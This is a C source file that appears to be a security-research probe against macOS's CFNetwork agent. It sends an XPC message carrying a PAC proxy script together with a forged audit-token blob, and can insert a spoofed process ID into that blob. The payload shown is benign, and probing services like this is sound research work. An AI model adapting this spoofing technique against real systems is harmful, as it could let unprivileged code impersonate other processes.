#include <dispatch/dispatch.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <xpc/xpc.h>

static const char *kService = "com.apple.cfnetwork.cfnetworkagent";

int main(int argc, char **argv) {
    long audit_len = -1;
    uint32_t spoof_pid = 0;
    int use_spoof_pid = 0;
    if (argc == 2) {
        if (!strncmp(argv[1], "pid:", 4)) {
            char *end = NULL;
            errno = 0;
            unsigned long value = strtoul(argv[1] + 4, &end, 0);
            if (errno || !end || *end || value > UINT32_MAX) {
                fprintf(stderr, "usage: %s [audit_length_0_to_32|pid:N]\n",
                        argv[0]);
                return 2;
            }
            spoof_pid = (uint32_t)value;
            use_spoof_pid = 1;
            audit_len = 32;
        } else {
            char *end = NULL;
            errno = 0;
            audit_len = strtol(argv[1], &end, 0);
            if (errno || !end || *end || audit_len < 0 || audit_len > 32) {
                fprintf(stderr, "usage: %s [audit_length_0_to_32|pid:N]\n",
                        argv[0]);
                return 2;
            }
        }
    }

    xpc_connection_t connection =
        xpc_connection_create_mach_service(kService, NULL, 0);
    if (!connection) {
        fputs("failed to create XPC connection\n", stderr);
        return 1;
    }

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        char *description = xpc_copy_description(event);
        fprintf(stderr, "event: %s\n", description ?: "(null)");
        free(description);
    });
    xpc_connection_resume(connection);

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_int64(message, "type", 1);
    xpc_dictionary_set_int64(message, "dtype", 2);
    xpc_dictionary_set_string(
        message, "source",
        "function FindProxyForURL(url, host) { "
        "dnsResolve('example.com'); return 'DIRECT'; }");
    xpc_dictionary_set_string(message, "target", "https://example.com/");

    uint8_t audit[32];
    memset(audit, 0x41, sizeof(audit));
    if (use_spoof_pid) {
        memset(audit, 0, sizeof(audit));
        ((uint32_t *)audit)[5] = spoof_pid;
    }
    if (audit_len >= 0) {
        xpc_dictionary_set_data(message, "audit", audit,
                                (size_t)audit_len);
    }

    dispatch_semaphore_t done = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(
        connection, message,
        dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0),
        ^(xpc_object_t reply) {
            char *description = xpc_copy_description(reply);
            printf("reply: %s\n", description ?: "(null)");
            free(description);
            dispatch_semaphore_signal(done);
        });

    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC);
    long timed_out = dispatch_semaphore_wait(done, deadline);
    xpc_release(message);
    xpc_connection_cancel(connection);
    xpc_release(connection);
    if (timed_out) {
        fputs("timed out waiting for reply\n", stderr);
        return 3;
    }
    return 0;
}
